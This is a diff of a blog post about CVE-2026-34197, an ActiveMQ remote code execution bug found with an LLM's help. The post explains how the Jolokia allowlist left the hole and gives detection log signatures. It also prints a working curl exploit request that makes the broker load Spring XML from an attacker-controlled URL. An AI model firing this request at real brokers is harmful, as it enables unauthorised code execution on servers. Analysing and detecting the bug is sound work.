@@ -1,15 +1,15 @@
 +++
-title = "Ten Minutes With Claude: The ActiveMQ Bug That Was Hiding for 13 Years"
+title = "The ActiveMQ Bug That Hid in Plain Sight for 13 Years — Until an LLM Read the Config"
 date = "2026-04-07"
 +++
 
-# Ten Minutes With Claude: The ActiveMQ Bug That Was Hiding for 13 Years
+# The ActiveMQ Bug That Hid in Plain Sight for 13 Years — Until an LLM Read the Config
 
-CVE-2026-34197 came out in April with a title that tells you the interesting part: "10 Minutes with Claude." The vulnerability is a 13-year-old RCE in Apache ActiveMQ Classic, found by an LLM doing a first pass over source code. The human did the gift-wrapping. The finding itself was 80% Claude.
+CVE-2026-34197 dropped in April, and its nickname says most of what you need to know: "10 Minutes with Claude." It's a 13-year-old remote code execution bug in Apache ActiveMQ Classic, and the person who found it didn't find it in the traditional sense — an LLM did, on a first pass through the source. The human's job was validating the finding, chaining it into a working exploit, and writing it up. By most estimates, the discovery itself was 80% Claude.
 
-## The bug that kept coming back
+## A patch that left the door unlocked
 
-ActiveMQ Classic ships a web console on port 8161 with Jolokia, an HTTP-to-JMX bridge that exposes broker management as a REST API. In 2022, ThreatBook showed that an authenticated attacker could invoke JDK MBeans like `FlightRecorder` through Jolokia to write webshells (CVE-2022-41678). The fix restricted Jolokia to read-only by default and denied dangerous MBeans, but added a blanket allow for ActiveMQ's own MBeans so the console kept working:
+ActiveMQ Classic ships with a web console on port 8161, built on Jolokia — an HTTP-to-JMX bridge that turns broker management into a REST API. Back in 2022, ThreatBook demonstrated that an authenticated attacker could abuse Jolokia to invoke JDK MBeans like `FlightRecorder` and drop webshells (CVE-2022-41678). The fix that followed locked Jolokia down to read-only access and blocked a list of dangerous MBeans — but it also carved out a blanket exception so the console itself wouldn't break:
 
 ```xml
 <allow>
@@ -21,13 +21,13 @@ ActiveMQ Classic ships a web console on port 8161 with Jolokia, an HTTP-to-JMX b
 </allow>
 ```
 
-That blanket allow is the whole story. Every operation on every ActiveMQ MBean became callable through Jolokia. The question was whether any of those operations could reach code execution. The answer, it turns out, was `addNetworkConnector`.
+That one exception is the entire story here. It made every operation on every ActiveMQ-owned MBean reachable through Jolokia, no questions asked. Nobody seems to have asked the obvious follow-up question at the time: could any of those operations actually get you code execution? Turns out one of them could — `addNetworkConnector`.
 
-## The chain
+## Following the chain
 
-ActiveMQ brokers can connect to each other in a network for load distribution. `addNetworkConnector(String)` sets up those bridges at runtime, and it accepts a discovery URI. ActiveMQ also has a VM transport, `vm://`, an in-process transport for embedding a broker inside an application. When a `vm://` URI references a broker that doesn't exist, ActiveMQ creates one on the fly, and it accepts a `brokerConfig` parameter telling it where to load configuration from, including remote URLs.
+ActiveMQ brokers can network together to distribute load, and `addNetworkConnector(String)` is what wires those connections up at runtime. It takes a discovery URI as input. Separately, ActiveMQ supports `vm://`, an in-process transport meant for embedding a broker directly inside an application. Point `vm://` at a broker that doesn't exist yet, and ActiveMQ will happily spin one up — using a `brokerConfig` parameter that tells it where to pull configuration from, including a remote URL.
 
-Chain those together and you get:
+Put those two features next to each other and the exploit writes itself:
 
 ```bash
 curl -s -X POST http://TARGET:8161/api/jolokia/ \
@@ -42,27 +42,27 @@ curl -s -X POST http://TARGET:8161/api/jolokia/ \
   }'
 ```
 
-The `vm://` transport sees a non-existent broker, calls `BrokerFactory.createBroker()` with the attacker-controlled URL, the `xbean:` scheme tells ActiveMQ to treat it as Spring XML config, and Spring's `ResourceXmlApplicationContext` instantiates every bean in it. A `MethodInvokingFactoryBean` calling `Runtime.getRuntime().exec()` is the classic sink, the same one used in CVE-2023-46604, which is on CISA's KEV list.
+The `vm://` transport notices the target broker doesn't exist, calls `BrokerFactory.createBroker()` against the attacker's URL, and the `xbean:` scheme tells ActiveMQ to parse the response as Spring XML. Spring's `ResourceXmlApplicationContext` then dutifully instantiates every bean defined in that file — including, if the attacker wants, a `MethodInvokingFactoryBean` wired up to call `Runtime.getRuntime().exec()`. It's the same sink that made CVE-2023-46604 a fixture on CISA's KEV list.
 
-## The unauthenticated bonus
+## Why this is worse than it sounds
 
-The exploit needs credentials, but default `admin:admin` is common. And on ActiveMQ 6.0.0-6.1.1, CVE-2024-32114 removed the `/api/*` path from the web console's security constraints entirely, so Jolokia is completely unauthenticated there. On those versions, CVE-2026-34197 is an unauthenticated RCE. The patch (5.19.6, 6.2.5) removed the ability for `addNetworkConnector` to add `vm://` transports, which was never meant to be a remote operation.
+Technically the exploit needs valid credentials, but `admin:admin` remains the default on a lot of ActiveMQ installs, so that's a low bar. It gets worse on ActiveMQ 6.0.0 through 6.1.1: CVE-2024-32114 accidentally stripped `/api/*` out of the web console's security constraints entirely, leaving Jolokia wide open with no authentication at all. On those versions, CVE-2026-34197 needs nothing but network access. The fix — shipped in 5.19.6 and 6.2.5 — simply removes the ability for `addNetworkConnector` to point at `vm://` transports, since that was never supposed to be something you could trigger remotely in the first place.
 
-## The detection side
+## What to actually watch for
 
-Horizon3's writeup includes the log signature, which is the part I actually use:
+The most useful part of Horizon3's writeup, for my money, is the log signature:
 
 ```text
 INFO | Establishing network connection from vm://localhost to vm://rce?create=true&brokerConfig=xbean:http://X.X.X.X:8888/payload.xml
 WARN | Could not connect to remote URI: ... The configuration has no BrokerService instance
 ```
 
-The WARN appears after the payload has already run. The broker repeats connection attempts several times, so there's a window. Other indicators: POSTs to `/api/jolokia/` containing `addNetworkConnector`, outbound HTTP from the broker process to unexpected hosts, and unexpected child processes from the Java process.
+That WARN line only shows up after the payload has already executed, but ActiveMQ retries the connection several times, so there's still a detection window to work with. Beyond the log lines themselves, keep an eye out for POST requests to `/api/jolokia/` containing `addNetworkConnector`, outbound HTTP calls from the broker process to hosts it has no business talking to, and any child processes spawned unexpectedly off the Java process.
 
-## What I think about the Claude part
+## The part I can't stop thinking about
 
-The finding method is the part I keep turning over. The workflow: prompt Claude lightly, set up a target on the network, let it validate findings. Most of what it finds doesn't rise to CVE level. This one did, with a couple of basic prompts.
+What sticks with me isn't the exploit chain — it's the discovery method. The setup was almost casually simple: give Claude a light prompt, point it at a target on the network, let it validate what it finds. Most of what comes out of that process doesn't amount to much. This time it did, off the back of a couple of basic prompts.
 
-I've been skeptical of AI-assisted vuln hunting, mostly because the demos are cherry-picked. But this is a different shape: the LLM didn't find a bug by fuzzing or pattern-matching a known class. It read the allowlist, noticed the blanket `*` on operations, and asked what an attacker could do with `addNetworkConnector`. That's reasoning about a security boundary, not pattern matching. The human validated it, built the exploit chain, and shipped the writeup.
+I went into this skeptical of AI-assisted vulnerability hunting, mostly because every demo I'd seen was cherry-picked to look impressive. This one felt different in kind, not just degree. The model wasn't fuzzing inputs or matching against a known bug class — it read an XML allowlist, noticed the blanket `*` sitting on `<operation>`, and asked what an attacker could actually do with `addNetworkConnector` once the door was open. That's reasoning about a security boundary, not pattern-matching against training data. A human still had to validate it, build the working chain, and write it up — but the question that mattered got asked by the model.
 
-The uncomfortable part: this bug sat in the code for 13 years. The allowlist fix from 2022 was reviewed, shipped, and deployed, and the hole it left was invisible to everyone until an LLM read the config and asked the right question. I don't know if that means the LLMs are getting good or the review process was always this porous. Probably both.
+And that's the uncomfortable part. This hole sat there for 13 years, through a patch cycle that was reviewed, approved, and shipped by people who presumably know ActiveMQ well. It took an LLM reading the config with fresh eyes to notice what the blanket allow actually permitted. I genuinely don't know whether that says more about how good these models are getting, or about how porous our review processes have been all along. Probably a bit of both.
